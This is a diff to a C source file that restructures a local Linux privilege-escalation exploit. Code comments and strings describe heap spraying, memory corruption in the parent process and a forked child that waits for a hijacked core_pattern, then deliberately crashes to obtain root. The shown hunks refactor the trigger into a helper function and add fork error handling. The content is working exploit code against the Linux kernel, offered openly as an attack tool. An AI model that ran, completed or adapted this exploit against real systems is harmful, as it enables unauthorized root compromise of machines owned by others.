@@ -237,14 +237,26 @@ void crash(char *cmd)
 	*(size_t *)0 = 0;
 }
 
+void wait_and_trigger_core_pattern(void)
+{
+	int ret = EXIT_FAILURE;
+
+	ret = do_cpu_pinning(1);
+	if (ret == EXIT_FAILURE)
+		return;
+
+	setsid();
+	crash("");
+}
+
 int main(int argc, char **argv)
 {
+	pid_t pid = -1;
 	int result = EXIT_FAILURE;
 	char *spray_data = NULL;
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
 	int spray_fd = -1;
-	int pid = -1;
 	int stdinfd, stdoutfd, stderrfd = -1;
 	char path0[64], path1[64], path2[64];
 
@@ -281,12 +293,22 @@ int main(int argc, char **argv)
 			printf("[-] heap spraying\n");
 		}
 	}
-	if (fork() == 0) /* this process is used to trigger core_pattern exploit */
-	{
-		if (do_cpu_pinning(1) == EXIT_FAILURE)
-			goto end;
-		setsid();
-		crash("");
+
+
+	/*
+	 * In the parent process we perform the memory corruption, and in the child
+	 * process we wait for the changed core_pattern and trigger a crash to get
+	 * privilege escalation.
+	 */
+	pid = fork();
+	if (pid < 0) {
+		perror("[-] fork");
+		goto end;
+	}
+
+	if (pid == 0) {
+		wait_and_trigger_core_pattern(); /* should not return */
+		return EXIT_FAILURE;
 	}
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
